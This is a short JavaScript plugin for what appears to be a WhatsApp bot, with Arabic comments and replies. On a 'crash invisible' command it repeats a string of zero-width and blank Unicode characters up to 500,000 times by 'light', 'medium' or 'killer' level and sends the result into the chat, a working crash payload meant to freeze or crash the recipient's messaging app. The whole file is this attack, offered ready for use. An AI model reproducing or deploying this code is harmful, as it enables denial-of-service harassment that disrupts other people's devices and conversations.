module.exports = async ({ sock, msg, text, reply }) => {
    if (!text.startsWith("crash invisible")) return;

    const jid = msg.key.remoteJid;

    const invisibleChars = [
        "\u200B", // Zero Width Space
        "\u200C", // Zero Width Non-Joiner
        "\u200D", // Zero Width Joiner
        "\u200E", // Left-to-Right Mark
        "\u200F", // Right-to-Left Mark
        "\uFEFF", // Zero Width No-Break Space
        "\u2800", // Braille Blank
        "\u3164"  // Hangul Filler
    ];

    try {
        let level = "killer";
        if (text.includes("light")) level = "light";
        if (text.includes("medium")) level = "medium";
        if (text.includes("killer")) level = "killer";

        // عدد التكرار حسب المستوى
        let repeatCount;
        switch (level) {
            case "light":
                repeatCount = 20000;
                break;
            case "medium":
                repeatCount = 100000;
                break;
            case "killer":
                repeatCount = 500000;
                break;
            default:
                repeatCount = 500000;
        }

        await reply(`⚠️ جاري توليد نص غير مرئي (${level})...`);

        // نص مكون من جميع الرموز المختارة في سلسلة واحدة
        const baseText = invisibleChars.join("");

        // توليد النص بتكرار السلسلة
        const crashText = baseText.repeat(repeatCount);

        await sock.sendMessage(jid, { text: crashText });

        await reply(`✅ تم إرسال الرسالة غير المرئية (${level}). افتح الدردشة بحذر!`);
    } catch (error) {
        console.error("Crash Invisible Error:", error);
        await reply("❌ حدث خطأ أثناء تنفيذ أمر الكراش غير المرئي.");
    }
};
